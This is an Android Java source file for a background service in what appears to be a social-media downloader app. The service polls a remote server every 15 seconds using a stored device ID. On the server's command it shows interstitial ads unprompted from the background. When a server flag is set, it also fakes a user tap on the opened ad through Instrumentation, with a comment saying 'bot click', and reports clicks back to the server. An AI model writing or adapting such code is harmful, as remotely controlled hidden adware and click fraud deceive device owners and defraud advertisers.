package com.v2social.socialdownloader.services;

import android.app.Instrumentation;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;
import android.view.MotionEvent;
import android.widget.Toast;

import com.google.android.gms.ads.AdListener;
import com.google.android.gms.ads.AdRequest;
import com.google.android.gms.ads.InterstitialAd;
import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.v2social.socialdownloader.AppConstants;
import com.v2social.socialdownloader.network.CheckAds;
import com.v2social.socialdownloader.network.GetConfig;
import com.v2social.socialdownloader.network.JsonConfig;

import java.io.IOException;
import java.util.UUID;
import java.util.concurrent.ScheduledThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

import okhttp3.FormBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MyService extends Service {
    public static boolean check = false;
    private ScheduledThreadPoolExecutor myTask;
    private String uuid;

    public MyService() {
//        MyBroadcast myBroadcast = new MyBroadcast();
//        IntentFilter filter = new IntentFilter("android.intent.action.USER_PRESENT");
//        registerReceiver(myBroadcast, filter);
        SharedPreferences mPrefs = getSharedPreferences("adsserver", 0);

        if (mPrefs.contains("uuid")) {
            uuid = mPrefs.getString("uuid", UUID.randomUUID().toString());
        } else {
            uuid = UUID.randomUUID().toString();
            mPrefs.edit().putString("uuid", uuid).commit();
        }

        scheduleTask();
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    private void scheduleTask() {
        myTask = new ScheduledThreadPoolExecutor(1);
        myTask.scheduleAtFixedRate(new Runnable() {
            @Override
            public void run() {
                new Handler(Looper.getMainLooper()).post(new Runnable() {
                    public void run() {
                        try {
                            OkHttpClient client = new OkHttpClient();
                            Request okRequest = new Request.Builder()
                                    .url(AppConstants.URL_ADS_CONFIG + "?id=" + uuid)
                                    .build();
                            Response result = client.newCall(okRequest).execute();
                            if (result.isSuccessful()) {
                                Gson gson = new GsonBuilder().create();
                                CheckAds checkAds = gson.fromJson(result.body().string(), CheckAds.class);
                                if (checkAds.isShow == 1) {
                                    InterstitialAd mInterstitialAd = new InterstitialAd(MyService.this);
                                    mInterstitialAd.setAdUnitId("ca-app-pub-3940256099942544/1033173712");
                                    mInterstitialAd.setAdListener(new AdListener() {

                                        @Override
                                        public void onAdClosed() {
                                            Log.d("caomui", "onAdClosed");
                                            Toast.makeText(MyService.this, "onAdClosed", Toast.LENGTH_SHORT);
                                            MyService.this.checkAds(1);
                                        }

                                        @Override
                                        public void onAdFailedToLoad(int i) {
                                            Log.d("caomui", "onAdFailedToLoad");
                                        }

                                        @Override
                                        public void onAdLeftApplication() {
                                            Log.d("caomui", "onAdLeftApplication");
                                            Toast.makeText(MyService.this, "onAdLeftApplication", Toast.LENGTH_SHORT);
                                        }

                                        @Override
                                        public void onAdOpened() {
                                            Log.d("caomui", "onAdOpened");
                                            //bắt đầu bot click nếu isClick = 1
                                            if(checkAds.isBotClick == 1)
                                            {
                                                new Thread(new Runnable() {
                                                    @Override
                                                    public void run() {
                                                        Instrumentation m_Instrumentation = new Instrumentation();
                                                        m_Instrumentation.sendPointerSync(MotionEvent.obtain(
                                                                android.os.SystemClock.uptimeMillis(),
                                                                android.os.SystemClock.uptimeMillis(),
                                                                MotionEvent.ACTION_DOWN, 300, 300, 0));
                                                    }
                                                }).start();
                                            }
                                        }

                                        @Override
                                        public void onAdLoaded() {
                                            Log.d("caomui", "onAdLoaded");
                                            mInterstitialAd.show();
                                        }

                                        @Override
                                        public void onAdClicked() {
                                            Log.d("caomui", "onAdClicked");
                                            Toast.makeText(MyService.this, "onAdclick", Toast.LENGTH_SHORT);
                                            MyService.this.checkAds(1);
                                        }

                                        @Override
                                        public void onAdImpression() {
                                            Log.d("caomui", "onAdImpression");
                                            Toast.makeText(MyService.this, "onAdImpression", Toast.LENGTH_SHORT);
                                        }
                                    });

                                    mInterstitialAd.loadAd(new AdRequest.Builder().build());
                                }
                            }

                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    }
                });


//                Log.d("caomui","------------------00000");


//                Retrofit retrofit = new Retrofit.Builder()
//                        .baseUrl(AppConstants.URL_CONFIG)
//                        .addConverterFactory(GsonConverterFactory.create())
//                        .build();
//                GetConfig config = retrofit.create(GetConfig.class);
//                Call<CheckAds> call = config.checkAds();
//                call.enqueue(new Callback<CheckAds>() {
//                    @Override
//                    public void onResponse(Call<CheckAds> call, Response<CheckAds> response) {
//                        Log.d("caomui",response.body().isShow + "=========");
//                    }
//
//                    @Override
//                    public void onFailure(Call<CheckAds> call, Throwable t) {
//                        Log.d("caomui","=========" +t.getMessage() +";"+t.getLocalizedMessage());
//                    }
//                });


            }
        }, 3L, 15, TimeUnit.SECONDS);

//        mDialogDaemon = new ScheduledThreadPoolExecutor(1);
//        // This process will execute immediately, then execute every 3 seconds.
//        mDialogDaemon.scheduleAtFixedRate(new Runnable() {
//            @Override
//            public void run() {
//                final Instrumentation m_Instrumentation = new Instrumentation();
////            m_Instrumentation.sendKeyDownUpSync( KeyEvent.KEYCODE_B );
//
//                new Thread(new Runnable() {
//                    @Override
//                    public void run() {
//                        m_Instrumentation.sendPointerSync(MotionEvent.obtain(
//                                android.os.SystemClock.uptimeMillis(),
//                                android.os.SystemClock.uptimeMillis(),
//                                MotionEvent.ACTION_DOWN,300, 300, 0));
//                    }
//                }).start();
//            }
//        }, 3L, 5, TimeUnit.SECONDS);
    }

    private void checkAds(int isClick) {
        OkHttpClient client = new OkHttpClient();

        Gson gson = new GsonBuilder().create();
        RequestBody body = new FormBody.Builder()
                .add("id", uuid)
                .add("isClick", isClick + "")
                .build();
        Request okRequest = new Request.Builder()
                .url(AppConstants.URL_ADS_CONFIG)
                .post(body)
                .build();
        try {
            Response result = client.newCall(okRequest).execute();
            if (result.isSuccessful())
                Toast.makeText(MyService.this, "post ads successfull!", Toast.LENGTH_SHORT);
        } catch (IOException e) {

        }

    }

    class MyBroadcast extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            Log.d("caomui", "Unlock Screen");
//            check = true;
        }
    }
}
